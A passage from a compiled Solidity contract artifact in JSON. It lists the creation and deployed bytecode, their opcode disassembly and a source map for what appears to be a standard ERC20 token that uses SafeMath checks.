							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xBAE DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x88 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x70A08231 GT PUSH2 0x5B JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x1FD JUMPI DUP1 PUSH4 0xA457C2D7 EQ PUSH2 0x255 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x2BB JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x321 JUMPI PUSH2 0x88 JUMP JUMPDEST DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x8D JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0xF3 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x111 JUMPI DUP1 PUSH4 0x39509351 EQ PUSH2 0x197 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xD9 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0xA3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x399 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xFB PUSH2 0x3B0 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x17D PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x127 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x3BA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1E3 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x1AD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x46B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x23F PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x213 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x510 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x2A1 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x26B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x558 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x307 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x2D1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x5FD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x383 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x337 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x614 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 PUSH2 0x3A6 CALLER DUP5 DUP5 PUSH2 0x69B JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3C7 DUP5 DUP5 DUP5 PUSH2 0x892 JUMP JUMPDEST PUSH2 0x460 DUP5 CALLER PUSH2 0x45B DUP6 PUSH1 0x1 PUSH1 0x0 DUP11 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xA22 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x69B JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x506 CALLER DUP5 PUSH2 0x501 DUP6 PUSH1 0x1 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP10 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xAAB SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x69B JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x5F3 CALLER DUP5 PUSH2 0x5EE DUP6 PUSH1 0x1 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP10 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xA22 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x69B JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x60A CALLER DUP5 DUP5 PUSH2 0x892 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x721 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x24 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xB56 PUSH1 0x24 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x7A7 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x22 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xB34 PUSH1 0x22 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH1 0x1 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH2 0x8E3 DUP2 PUSH1 0x0 DUP1 DUP7 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xA22 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH2 0x976 DUP2 PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xAAB SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 GT ISZERO PUSH2 0xA9A JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1E DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A207375627472616374696F6E206F766572666C6F770000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP3 DUP5 SUB SWAP1 POP DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 DUP5 ADD SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 0xB29 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID GASLIMIT MSTORE NUMBER ORIGIN ADDRESS GASPRICE KECCAK256 PUSH2 0x7070 PUSH19 0x6F766520746F20746865207A65726F20616464 PUSH19 0x65737345524332303A20617070726F76652066 PUSH19 0x6F6D20746865207A65726F2061646472657373 LOG2 PUSH6 0x627A7A723158 KECCAK256 0xE9 0xE8 0xE3 DUP9 0xA7 0xCB 0xCD 0xD9 DUP8 JUMPI SELFDESTRUCT LT XOR 0xAE 0xD5 PUSH26 0xD1B3728701042977CEE25A9D4096DFC364736F6C634300051100 ORIGIN ",
							"sourceMap": "1256:6531:1:-;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;1256:6531:1;;;;;;;"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100885760003560e01c806370a082311161005b57806370a08231146101fd578063a457c2d714610255578063a9059cbb146102bb578063dd62ed3e1461032157610088565b8063095ea7b31461008d57806318160ddd146100f357806323b872dd146101115780633950935114610197575b600080fd5b6100d9600480360360408110156100a357600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610399565b604051808215151515815260200191505060405180910390f35b6100fb6103b0565b6040518082815260200191505060405180910390f35b61017d6004803603606081101561012757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506103ba565b604051808215151515815260200191505060405180910390f35b6101e3600480360360408110156101ad57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061046b565b604051808215151515815260200191505060405180910390f35b61023f6004803603602081101561021357600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610510565b6040518082815260200191505060405180910390f35b6102a16004803603604081101561026b57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610558565b604051808215151515815260200191505060405180910390f35b610307600480360360408110156102d157600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506105fd565b604051808215151515815260200191505060405180910390f35b6103836004803603604081101561033757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610614565b6040518082815260200191505060405180910390f35b60006103a633848461069b565b6001905092915050565b6000600254905090565b60006103c7848484610892565b610460843361045b85600160008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610a2290919063ffffffff16565b61069b565b600190509392505050565b6000610506338461050185600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610aab90919063ffffffff16565b61069b565b6001905092915050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b60006105f333846105ee85600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610a2290919063ffffffff16565b61069b565b6001905092915050565b600061060a338484610892565b6001905092915050565b6000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610721576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526024815260200180610b566024913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614156107a7576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526022815260200180610b346022913960400191505060405180910390fd5b80600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040518082815260200191505060405180910390a3505050565b6108e3816000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610a2290919063ffffffff16565b6000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610976816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610aab90919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a3505050565b600082821115610a9a576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601e8152602001807f536166654d6174683a207375627472616374696f6e206f766572666c6f77000081525060200191505060405180910390fd5b600082840390508091505092915050565b600080828401905083811015610b29576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b809150509291505056fe45524332303a20617070726f766520746f20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f2061646472657373a265627a7a72315820e9e8e388a7cbcdd98757ff1018aed579d1b3728701042977cee25a9d4096dfc364736f6c63430005110032",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x88 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x70A08231 GT PUSH2 0x5B JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x1FD JUMPI DUP1 PUSH4 0xA457C2D7 EQ PUSH2 0x255 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x2BB JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x321 JUMPI PUSH2 0x88 JUMP JUMPDEST DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x8D JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0xF3 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x111 JUMPI DUP1 PUSH4 0x39509351 EQ PUSH2 0x197 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xD9 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0xA3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x399 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xFB PUSH2 0x3B0 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x17D PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x127 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x3BA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1E3 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x1AD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 